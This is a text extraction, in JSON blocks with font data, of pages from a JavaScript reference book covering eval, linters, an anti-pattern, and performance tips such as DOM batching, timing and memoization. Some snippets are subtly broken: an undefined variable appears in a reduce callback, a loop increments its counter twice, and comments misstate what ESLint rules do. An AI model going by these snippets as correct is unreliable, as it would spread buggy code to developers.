        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  assertions  =   [         assert (  add ( 0 ,   0 )   ==   0 ,   'add(0, 0) should return 0...' ),         assert (  add ( 0 ,   - 1 )   ==   - 1 ,   'add(0, -1) should return -1...' ),         assert (  add ( 0 ,   1 )   ==   1 ,   'add(0, 1) should return 1...' )      ] . reduce ( function ( previousValue ,  currentValue ){          return  previousValue  +  current ;      });      if   ( assertions  ===  passed )   {         console. log ( \"add(x,y)... did return the sum of two integers\" );          return   true ;      }   else   {         console. log ( \"add(x,y)... does not reliably return the sum of two integers\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 444",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 101: Evaluating JavaScript",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "string The JavaScript to be evaluated. In JavaScript, the  eval  function evaluates a string as if it were JavaScript code. The return value is the result of the evaluated string, e.g.  eval ( '2 + 2' )  returns  4 . eval  is available in the global scope. The lexical scope of the evaluation is the local scope unless invoked indirectly",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "(e.g.  var  geval  =  eval ;  geval ( s ); ).",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The use of  eval  is strongly discouraged.  See the Remarks section for details.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 101.1: Evaluate a string of JavaScript statements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  x  =   5 ; var  str  =   \"if (x == 5) {console.log('z is 42'); z = 42;} else z = 0; \" ; console. log ( \"z is \" ,  eval ( str ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The use of  eval  is strongly discouraged.  See the Remarks section for details.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 101.2: Introduction",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can always run JavaScript from inside itself, although this is  strongly discouraged  due to the security vulnerabilities it presents (see Remarks for details). To run JavaScript from inside JavaScript, simply use the below function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "eval ( \"var a = 'Hello, World!'\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 101.3: Evaluation and Math",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can set a variable to something with the  eval ()  function by using something similar to the below code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   10 ; var  y  =   20 ; var  a  =  eval ( \"x * y\" )   +   \"<br>\" ; var  b  =  eval ( \"2 + 2\" )   +   \"<br>\" ; var  c  =  eval ( \"x + 17\" )   +   \"<br>\" ; var  res  =  a  +  b  +  c ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The result, stored in the variable  res , will be: 200 4 27 The use of  eval  is strongly discouraged.  See the Remarks section for details.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 445",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 102: Linters - Ensuring code quality",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 102.1: JSHint",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JSHint  is an open source tool which detects errors and potential problems in JavaScript code. To lint your JavaScript you have two options. Go to  JSHint.com  and paste your code in there on line text editor. 1. Install  JSHint in your IDE . 2. Atom:  linter-jshint  (must have  Linter  plugin installed) Sublime Text:  JSHint Gutter  and/or  Sublime Linter Vim:  jshint.vim  or  jshint2.vim Visual Studio:  VSCode JSHint A bene\ufb01t of adding it to your IDE is that you can create a JSON con\ufb01guration \ufb01le named  . jshintrc  that will be used when linting your program. This is convent if you want to share con\ufb01gurations between projects. Example  . jshintrc  \ufb01le {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     \"-W097\" :   false ,   // Allow \"use strict\" at document level      \"browser\" :   true ,   // defines globals exposed by modern browsers http://jshint.com/docs/options/#browser      \"curly\" :   true ,   // requires you to always put curly braces around blocks in loops and conditionals http://jshint.com/docs/options/#curly      \"devel\" :   true ,   // defines globals that are usually used for logging poor-man's debugging: console, alert, etc. http://jshint.com/docs/options/#devel      // List global variables (false means read only)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     \"globals\" :   {          \"globalVar\" :   true      },",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     \"jquery\" :   true ,   // This option defines globals exposed by the jQuery JavaScript library.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     \"newcap\" :   false ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // List any global functions or const vars",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     \"predef\" :   [          \"GlobalFunction\" ,          \"GlobalFunction2\"      ],",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     \"undef\" :   true ,   // warn about undefined vars      \"unused\" :   true   // warn about unused vars }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "JSHint also allows con\ufb01gurations for speci\ufb01c lines/blocks of code",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "switch ( operation ) {     case   '+'     {       result  =  a  +  b ;        break ;     }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    // JSHint W086 Expected a 'break' statement     // JSHint flag to allow cases to not need a break     /* falls through */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 446",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    case   '*' :     case   'x' :     {       result  =  a  *  b ;        break ;     } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// JSHint disable error for variable not defined, because it is defined in another file /* jshint -W117 */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "globalVariable  =   'in-another-file.js' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "/* jshint +W117 */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "More con\ufb01guration options are documented at  http://jshint.com/docs/options/",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 102.2: ESLint / JSCS",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "ESLint  is a code style linter and formatter for your style guide  much like JSHint . ESLint merged with  JSCS  in April of 2016. ESLint does take more e\ufb00ort to set up than JSHint, but there are clear instructions on their  website  for getting started. A sample con\ufb01guration for ESLint is as follows: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     \"rules\" :   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         \"semi\" :   [ \"error\" ,   \"always\" ],   // throw an error when semicolons are detected          \"quotes\" :   [ \"error\" ,   \"double\" ]   // throw an error when double quotes are detected",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A sample con\ufb01guration \ufb01le where ALL rules are set to o\ufb00, with descriptions for what they do can be found  here .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 102.3: JSLint",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JSLint  is the trunk from which JSHint branched. JSLint takes a much more opinionated stance on how to write JavaScript code, pushing you towards only using the parts  Douglas Crockford  deems to be its \"good parts\", and away from any code that Crockford believes to have a better solution. The following StackOver\ufb02ow thread may help you decide  which linter is right for you . While there are di\ufb00erences (here are some brief comparisons between it and  JSHint  /  ESLint ), each option is extremely customizable. For a more information about con\ufb01guring JSLint check out  NPM  or  github .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 447",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 103: Anti-patterns",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 103.1: Chaining assignments in var declarations",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Chaining assignments as part of a  var  declaration will create global variables unintentionally. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function  foo ()   {           var  a  =  b  =   0 ; })() console. log ( 'a: '   +  a ); console. log ( 'b: '   +  b );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Will result in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Uncaught ReferenceError :  a is not defined 'b: 0'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the above example,  a  is local but  b  becomes global. This is because of the right to left evaluation of the  = operator. So the above code actually evaluated as",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   ( b  =   0 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The correct way to chain var assignments is:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a ,  b ; a  =  b  =   0 ; Or: var  a  =   0 ,  b  =  a ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will make sure that both  a  and  b  will be local variables.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 448",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 104: Performance Tips",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "JavaScript, like any language, requires us to be judicious in the use of certain language features. Overuse of some features can decrease performance, while some techniques can be used to increase performance.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.1: Avoid try/catch in performance-critical functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Some JavaScript engines (for example, the current version of Node.js and older versions of Chrome before Ignition+turbofan) don't run the optimizer on functions that contain a try/catch block. If you need to handle exceptions in performance-critical code, it can be faster in some cases to keep the try/catch in a separate function. For example, this function will not be optimized by some implementations:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  myPerformanceCriticalFunction ()   {      try   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // do complex calculations here",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }   catch   ( e )   {         console. log ( e );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, you can refactor to move the slow code into a separate function (that  can  be optimized) and call it from inside the  try  block.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// This function can be optimized",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  doCalculations ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // do complex calculations here } // Still not always optimized, but it's not doing much so the performance doesn't matter",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  myPerformanceCriticalFunction ()   {      try   {         doCalculations ();      }   catch   ( e )   {         console. log ( e );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here's a jsPerf benchmark showing the di\ufb00erence:  https://jsperf.com/try-catch-deoptimization . In the current version of most browsers, there shouldn't be much di\ufb00erence if any, but in less recent versions of Chrome and Firefox, or IE, the version that calls a helper function inside the try/catch is likely to be faster. Note that optimizations like this should be made carefully and with actual evidence based on pro\ufb01ling your code. As JavaScript engines get better, it could end up hurting performance instead of helping, or making no di\ufb00erence at all (but complicating the code for no reason). Whether it helps, hurts, or makes no di\ufb00erence can depend on a lot of factors, so always measure the e\ufb00ects on your code. That's true of all optimizations, but especially micro- optimizations like this that depend on low-level details of the compiler/runtime.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 104.2: Limit DOM Updates",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A common mistake seen in JavaScript when run in a browser environment is updating the DOM more often than necessary. The issue here is that every update in the DOM interface causes the browser to re-render the screen. If an update",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 449",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "changes the layout of an element in the page, the entire page layout needs to be re-computed, and this is very performance-heavy even in the simplest of cases. The process of re-drawing a page is known as  re\ufb02ow  and can cause a browser to run slowly or even become unresponsive. The consequence of updating the document too frequently is illustrated with the following example of adding items to a list. Consider the following document containing a  <ul>  element:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<!DOCTYPE html >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<html>      <body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         <ul   id = \"list\" ></ul>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     </body> </html>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We add  5000  items to the list looping 5000 times (you can try this with a larger number on a powerful computer to increase the e\ufb00ect).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  list  =  document. getElementById ( \"list\" ); for ( var  i  =   1 ;  i  <=   5000 ;  i ++)   {                  list. innerHTML   +=  ` < li > item $ { i }</ li > ` ;    // update 5000 times }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this case, the performance can be improved by batching all 5000 changes in one single DOM update.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  list  =  document. getElementById ( \"list\" ); var  html  =   \"\" ; for ( var  i  =   1 ;  i  <=   5000 ;  i ++)   {     html  +=  ` < li > item $ { i }</ li > ` ; } list. innerHTML   =  html ;       // update once",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The function  document. createDocumentFragment ()  can be used as a lightweight container for the HTML created by the loop. This method is slightly faster than modifying the container element's  innerHTML  property (as shown below).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  list  =  document. getElementById ( \"list\" ); var  fragment  =  document. createDocumentFragment (); for ( var  i  =   1 ;  i  <=   5000 ;  i ++)   {     li  =  document. createElement ( \"li\" );     li. innerHTML   =   \"item \"   +  i ;     fragment. appendChild ( li );     i ++; } list. appendChild ( fragment );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 104.3: Benchmarking your code - measuring execution time",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Most performance tips are very dependent of the current state of JS engines and are expected to be only relevant at a given time. The fundamental law of performance optimization is that you must \ufb01rst measure before trying to optimize, and measure again after a presumed optimization. To measure code execution time, you can use di\ufb00erent time measurement tools like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 450",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Performance  interface that represents timing-related performance information for the given page (only available in browsers). process.hrtime  on Node.js gives you timing information as [seconds, nanoseconds] tuples. Called without argument it returns an arbitrary time but called with a previously returned value as argument it returns the di\ufb00erence between the two executions. Console timers   console. time ( \"labelName\" )  starts a timer you can use to track how long an operation takes. You give each timer a unique label name, and may have up to 10,000 timers running on a given page. When you call console. timeEnd ( \"labelName\" )  with the same name, the browser will \ufb01nish the timer for given name and output the time in milliseconds, that elapsed since the timer was started. The strings passed to time() and timeEnd() must match otherwise the timer will not \ufb01nish. Date.now  function  Date. now ()  returns current  Timestamp  in milliseconds, which is a  Number  representation of time since 1 January 1970 00:00:00 UTC until now. The method now() is a static method of Date, therefore you always use it as Date.now().",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 1  using:  performance. now ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example we are going to calculate the elapsed time for the execution of our function, and we are going to use the  Performance.now()  method that returns a  DOMHighResTimeStamp , measured in milliseconds, accurate to one thousandth of a millisecond.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  startTime ,  endTime ; function  myFunction ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //Slow code you want to measure } //Get the start time",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "startTime  =  performance. now ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Call the time-consuming function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myFunction ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Get the end time",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "endTime  =  performance. now ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//The difference is how many milliseconds it took to call myFunction()",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. debug ( 'Elapsed time:' ,   ( endTime  -  startTime ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The result in console will look something like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Elapsed time :   0.10000000009313226",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Usage of  performance. now ()  has the highest precision in browsers with accuracy to one thousandth of a millisecond, but the lowest  compatibility .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 2  using:  Date. now ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example we are going to calculate the elapsed time for the initialization of a big array (1 million values), and we are going to use the  Date. now ()  method",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  t0  =  Date. now ();   //stores current Timestamp in milliseconds since 1 January 1970 00:00:00 UTC let  arr  =   [];   //store empty array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for   ( let  i  =   0 ;  i  <   1000000 ;  i ++)   {   //1 million iterations",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   arr. push ( i );   //push current i value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 451 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( Date. now ()   -  t0 );   //print elapsed time between stored t0 and now",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example 3  using:  console. time ( \"label\" )  &  console. timeEnd ( \"label\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example we are doing the same task as in Example 2, but we are going to use the  console. time ( \"label\" )  &",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. timeEnd ( \"label\" )  methods",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. time ( \"t\" );   //start new timer for label name: \"t\" let  arr  =   [];   //store empty array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for ( let  i  =   0 ;  i  <   1000000 ;  i ++)   {   //1 million iterations",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   arr. push ( i );   //push current i value } console. timeEnd ( \"t\" );   //stop the timer for label name: \"t\" and print elapsed time",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Exemple 4  using  process. hrtime ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In Node.js programs this is the most precise way to measure spent time.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  start  =  process. hrtime ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// long execution here, maybe asynchronous",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  diff  =  process. hrtime ( start );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// returns for example [ 1, 2325 ]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( `Operation took $ { diff [ 0 ]   *  1e9  +  diff [ 1 ]}  nanoseconds` );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// logs: Operation took 1000002325 nanoseconds",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 104.4: Use a memoizer for heavy-computing functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If you are building a function that may be heavy on the processor (either clientside or serverside) you may want to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "consider a  memoizer  which is a  cache of previous function executions and their returned values . This allows you to",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "check if the parameters of a function were passed before. Remember, pure functions are those that given an input, return a corresponding unique output and don't cause side-e\ufb00ects outside their scope so, you should not add memoizers to functions that are unpredictable or depend on external resources (like AJAX calls or randomly returned values). Let's say I have a recursive factorial function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  fact ( num )   {    return   ( num  ===   0 )?   1   :  num  *  fact ( num  -   1 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If I pass small values from 1 to 100 for example, there would be no problem, but once we start going deeper, we might blow up the call stack or make the process a bit painful for the JavaScript engine we're doing this in, especially if the engine doesn't count with tail-call optimization (although Douglas Crockford says that native ES6 has tail-call optimization included). We could hard code our own dictionary from 1 to god-knows-what number with their corresponding factorials but, I'm not sure if I advise that! Let's create a memoizer, shall we?",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  fact  =   ( function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  cache  =   {};   // Initialise a memory cache object      // Use and return this function to check if val is cached",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 452",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   function  checkCache ( val )   {      if   ( val  in  cache )   {       console. log ( 'It was in the cache :D' );        return  cache [ val ];   // return cached      }   else   {       cache [ val ]   =  factorial ( val );   // we cache it",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       return  cache [ val ];   // and then return it",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     /* Other alternatives for checking are:     || cache.hasOwnProperty(val) or !!cache[val]     || but wouldn't work if the results of those     || executions were falsy values.     */    }    // We create and name the actual function to be used",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   function  factorial ( num )   {      return   ( num  ===   0 )?   1   :  num  *  factorial ( num  -   1 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   }   // End of factorial function    /* We return the function that checks, not the one   || that computes because  it happens to be recursive,   || if it weren't you could avoid creating an extra   || function in this self-invoking closure function.   */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  checkCache ; }());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now we can start using it: Now that I start to re\ufb02ect on what I did, if I were to increment from 1 instead of decrement from  num , I could have cached all of the factorials from 1 to  num  in the cache recursively, but I will leave that for you. This is great but what if we have  multiple parameters ? This is a problem? Not quite, we can do some nice tricks like using JSON.stringify() on the arguments array or even a list of values that the function will depend on (for object-oriented approaches). This is done to generate a unique key with all the arguments and dependencies included. We can also create a function that \"memoizes\" other functions, using the same scope concept as before (returning a new function that uses the original and has access to the cache object): WARNING: ES6 syntax, if you don't like it, replace ... with nothing and use the  var  args  = Array. prototype . slice . call ( null ,  arguments );  trick; replace const and let with var, and the other things you already know.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_468_1.png"
        ]
    },
    {
        "text": "function  memoize ( func )   {    let  cache  =   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // You can opt for not naming the function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   function  memoized ( ... args )   {      const  argsKey  =  JSON. stringify ( args );    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 453",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     // The same alternatives apply for this example",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( argsKey  in  cache )   {       console. log ( argsKey  +   ' was/were in cache :D' );        return  cache [ argsKey ];      }   else   {       cache [ argsKey ]   =  func. apply ( null ,  args );   // Cache it        return  cache [ argsKey ];   // And then return it      }    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  memoized ;   // Return the memoized function }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now notice that this will work for multiple arguments but won't be of much use in object-oriented methods I think, you may need an extra object for dependencies. Also,  func. apply ( null ,  args )  can be replaced with func ( ... args )  since array destructuring will send them separately instead of as an array form. Also, just for reference, passing an array as an argument to func won't work unless you use  Function. prototype . apply  as I did. To use the above method you just:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  newFunction  =  memoize ( oldFunction );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Assuming new oldFunction just sums/concatenates:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "newFunction ( 'meaning of life' ,   42 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// -> \"meaning of life42\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "newFunction ( 'meaning of life' ,   42 );   // again",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// => [\"meaning of life\",42] was/were in cache :D // -> \"meaning of life42\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 104.5: Initializing object properties with null",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
